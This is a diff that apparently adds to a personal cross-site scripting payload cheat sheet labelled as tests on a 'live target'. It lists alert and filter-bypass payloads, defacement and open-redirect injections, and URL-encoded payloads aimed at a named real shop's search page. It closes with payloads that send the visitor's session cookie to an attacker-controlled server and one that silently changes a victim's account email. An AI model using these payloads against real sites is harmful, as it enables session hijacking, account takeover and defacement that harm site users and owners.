@@ -29,3 +29,95 @@ CONSOLE LOG :
          |
          |_ <a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:console.log(1337)">XSS</a>
 
+
+						XSS Bypass Payloads Testing on LIVE TARAGET | POC
+
+XSS with Error Messages:)
+
+    --> '<font color="red">ERROR 1064 (42000): Rohith had made an error in your Search Field;.jpg'
+
+    --> '"><img src=x onerror="document.body.innerHTML += '<div style=\'position:fixed;top:50%;left:50%;transform:translate(-50%, -50%);background-color:red;color:white;padding:20px;border-radius:10px;font-size:20px;z-index:9999;\'>ROHIT</div>';setTimeout(function(){document.querySelector('div').remove();}, 3000);">
+
+    --> '<font color="red">ERROR 1064 (42000): <h1>Rohith had made an error in your  Search Field;.jpg'
+
+
+XSS With Open redirect : )
+   -->  '"><img src=x onerror="window.location.href='https://www.youtube.com/@hackwithrohit-new-2k';">
+
+
+XSS with Image Injection :)
+
+
+   --> '"><img src=x onerror="document.body.innerHTML += '<img src=\'https://yt3.googleusercontent.com/igA5672w3ZWQcEe6OUE8q8-j4llVmEVftgq_EZBOGIva8GAnRmueug2nhUabrNZMH6FnDg6z=s160-c-k-c0x00ffffff-no-rj\' style=\'position:fixed;top:50%;left:50%;transform:translate(-50%, -50%);z-index:9999;border:5px solid red;\'>';">
+
+Classic XSS Alert Payloads :)
+
+
+	'<IFRAME SRC="javascript:alert(document.cookie);">.jpg'
+
+	'"><img src=x onerror=alert('ROHIT')>.jpg'
+
+	'"><img src=x onerror=alert(document.cookie)>.jpg'
+
+	'<img src=x onerror=alert(document.cookie)>.png'
+
+	'<img src=x onerror=alert(document.domain)>.jpg'
+
+	'<img src=x onerror=alert(document.domain)>.png'
+
+	'"><img src=x onerror=prompt(document.cookie)>.jpg'
+
+	'<svg onload=alert(document.cookie)>.jpg'
+
+	'<svg onload=alert(document.domain)>.jpg'
+
+
+	XSS Bypass by Url Encoding
+
+Vulnerble : https://www.nobullproject.com/collections/shop?q=
+
+XSS with Image Injection :)
+
+%3Cimg%20src%3Dhttps%3A%2F%2Fcdn.pixabay.com%2Fanimation%2F2023%2F09%2F07%2F21%2F54%2F21-54-00-174_512.gif%20%3E
+
+%3Cmarquee%3E%3Cimg%20src%3D%22https%3A%2F%2Fcdn.pixabay.com%2Fanimation%2F2023%2F09%2F07%2F21%2F54%2F21-54-00-174_512.gif%22%20alt%3D%22GIF%22%3E%20Rohit%20is%20the%20real%20Mr.%20Robot%3C%2Fmarquee%3E%0D%0A
+
+Adding Marquee tag :)
+
+%3Cmarquee%3ERohit%20hacked%20this%20website%20using%20xss%3C%2Fmarquee%3E
+
+%3Cmarquee%20style%3D%22font-family%3A%20%27Hack%27%2C%20monospace%3B%20color%3A%20green%3B%22%3ERohit%20hacked%20this%20website%20using%20XSS%3C%2Fmarquee%3E%0D%0A
+
+To check HTMLI --> <i>test</i>
+
+open redirect 
+
+%3Cimg%20src%3Dx%20onerror%3D%22window.location.href%3D%27https%3A%2F%2Fwww.youtube.com%2F%40hackwithrohit-new-2k%27%3B%22%3E%0D%0A%0D%0A
+
+
+https://dencode.com/en/  
+
+
+                                       chain xss and htmli
+
+
+Create an Advanced Payload for Session Hijacking or Credential Theft:
+
+To make the attack more severe, craft a payload that captures the user's session cookie and sends it to an external server under your control:
+
+<img src=x onerror="fetch('https://your-server.com/log?cookie=' + document.cookie)">
+
+Escalate the Attack to Simulate CSRF Actions:
+
+Craft a payload that submits unauthorized actions on behalf of the user. For example, simulate a form submission to change the user's profile information:
+
+<img src=x onerror="document.body.innerHTML+='<form id=\"csrf_form\" action=\"https://target.com/change-email\" method=\"POST\"><input type=\"hidden\" name=\"email\" value=\"attacker@malicious.com\"></form>'; document.getElementById('csrf_form').submit();">
+
+
+Example Payload for Combined HTML Injection and Persistent XSS
+
+<div><img src=x onerror="fetch('https://your-server.com/log?cookie=' + document.cookie)"></div>
+
+For greater obfuscation or bypassing filters:
+
+<div onmouseover="fetch('https://your-server.com/log?cookie=' + document.cookie)">Hover over me</div>
